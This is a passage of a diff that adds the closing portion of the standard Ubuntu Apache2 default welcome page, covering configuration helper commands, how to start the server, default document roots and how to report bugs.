+                           <tt>
+                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2enconf">a2enconf</a>,
+                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2disconf">a2disconf</a>
+                           </tt>. See their respective man pages for detailed information.
+                        </li>
+
+                        <li>
+                           The binary is called apache2. Due to the use of
+                           environment variables, in the default configuration, apache2 needs to be
+                           started/stopped with <tt>/etc/init.d/apache2</tt> or <tt>apache2ctl</tt>.
+                           <b>Calling <tt>/usr/bin/apache2</tt> directly will not work</b> with the
+                           default configuration.
+                        </li>
+          </ul>
+        </div>
+
+        <div class="section_header">
+            <div id="docroot"></div>
+                Document Roots
+        </div>
+
+        <div class="content_section_text">
+            <p>
+                By default, Ubuntu does not allow access through the web browser to
+                <em>any</em> file apart of those located in <tt>/var/www</tt>,
+                <a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html">public_html</a>
+                directories (when enabled) and <tt>/usr/share</tt> (for web
+                applications). If your site is using a web document root
+                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
+                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
+            </p>
+            <p>
+                The default Ubuntu document root is <tt>/var/www/html</tt>. You
+                can make your own virtual hosts under /var/www. This is different
+                to previous releases which provides better security out of the box.
+            </p>
+        </div>
+
+        <div class="section_header">
+          <div id="bugs"></div>
+                Reporting Problems
+        </div>
+        <div class="content_section_text">
+          <p>
+                Please use the <tt>ubuntu-bug</tt> tool to report bugs in the
+                Apache2 package with Ubuntu. However, check <a
+                href="https://bugs.launchpad.net/ubuntu/+source/apache2">existing
+                bug reports</a> before reporting a new bug.
+          </p>
+          <p>
+                Please report bugs specific to modules (such as PHP and others)
+                to respective packages, not to the web server itself.
+          </p>
+        </div>
+
+
+
+
+      </div>
+    </div>
+    <div class="validator">
+    </div>
+  </body>
+</html>
+
